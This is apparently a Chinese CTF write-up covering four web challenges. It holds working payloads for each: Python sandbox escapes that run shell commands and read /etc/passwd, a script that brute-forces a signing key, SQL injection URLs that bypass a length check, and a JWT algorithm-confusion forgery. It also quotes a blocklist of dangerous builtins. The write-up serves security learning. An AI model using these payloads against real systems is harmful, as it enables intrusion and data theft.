
# web
### outdated
#python_escape 
上传python文件,服务器会执行
```python

blocked = ["__import__", "globals", "locals", "__builtins__", "dir", "eval", "exec",
        "breakpoint", "callable", "classmethod", "compile", "staticmethod", "sys",
        "__importlib__", "delattr", "getattr", "setattr", "hasattr", "sys", "open"]
```


基本上是 #ssti 的思路,感觉没啥问题啊
```python
# ''.__class__.__bases__[0].__subclasses__()[132].__init__['__gl\x6fbals__']['po\x70en']('ls').read()
print([].__class__.__mro__[-1].__subclasses__()[94]("/etc/passwd").read())
```

payload
```python
print("".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat flag-54f44180-b995-4083-9428-677e827126d5.txt').read())
```

---
```python
print(print.__self__.__loader__().load_module('o' + 's').__dict__['pop'+'en']('cat flag-2fc862c3-cad0-4736-8274-1d805fca98b4.txt').read())
```



在测试黑名单前会调用`clean_comments_and_strings` 函数
`print(.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[]().read())`
*那为啥globals没匹配到*

`blocked_regex = re.compile(fr'({"|".join(blocked)})(?![a-zA-Z0-9_])')
> 如果"blocked"列表中包含了字符串"eval"，那么正则表达式将匹配以下字符串："eval(", "eval+", "eval\n"等。但是不会匹配"evaluate"或"evaluation"等以"eval"开头但后面跟着字母数字字符的字符串。
### pay_to_win

- 存在任意文件读取
```python
    if payload['user_type'] == 'premium':
        theme_name = request.args.get('theme') or 'static/premium.css'
        return render_template('premium.jinja', theme_to_use=open(theme_name).read())
```

- 爆破密钥
```python
import hashlib
def hash(data):
    return hashlib.sha256(bytes(data, 'utf-8')).hexdigest()


data='eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJ1c2VyX3R5cGUiOiAiYmFzaWMifQ=='

real="1af835e5354b1eabb67dfe7df8818f7377f4c83066de39ad3187fd8035f84cb7"
import random

for i in range(0,2**24):
    if hash(data+hex(i)[2:])==real:
        print(hex(i)[2:])
```

得到密钥`cc1f79`
本目录和根目录都没有flag,随便试了一下读取Dockerfile,提示flag在`/secret-flag-dir/flag.txt`

### ezsql
#nodejs #sql 
```js
app.get('/search', (req, res) => {
    const { name } = req.query;

    if (!name) {
        return res.status(400).send({ err: 'Bad request' });
    }

    if (name.length > 6) { 
        return res.status(400).send({ err: 'Bad request' });
    }

    db.all(`SELECT * FROM jokes WHERE joke LIKE '%${name}%'`, (err, rows) => {
        if (err) {
            console.error(err.message);
            return res.status(500).send('Internal server error');
        }

        return res.send(rows);
    });
});
```
很明显存在sql注入,但是存在长度限制,使用 `?name[]=`绕过去,这样就会获取数组的长度

- 注入得到flag表名
`search?name[]=1' union SELECT 1,name FROM sqlite_master WHERE type = 'table' --+`
- flag
`search?name[]=1' union SELECT 1,* from flag_601bfe49_65f6_4b9a_a142_40b2a3350327 --+`

### back-to-the-past

---

```python
def generate_token(id, username, year):
    return jwt.encode(
        {"id": id, "username": username, "year": year}, private_key, algorithm="RS256"
    )


def verify_token(token):
    try:
        return jwt.decode(token.encode(), public_key, algorithms=["HS256", "RS256"])
    except:
        return None
```

可以看到使用rs256非对称加密,我们只有公钥,如果伪造session需要私钥解密
但是还支持另外一种算法`hs256`,直接修改代码生成

```python
def generate_token(id, username, year):
    return jwt.encode(
        {"id": id, "username": username, "year": year}, public_key, algorithm="HS256"
    )
```



# reverse

# pwn

# crypto

# Misc


---
## *相关wp*




2023-05-27   19:07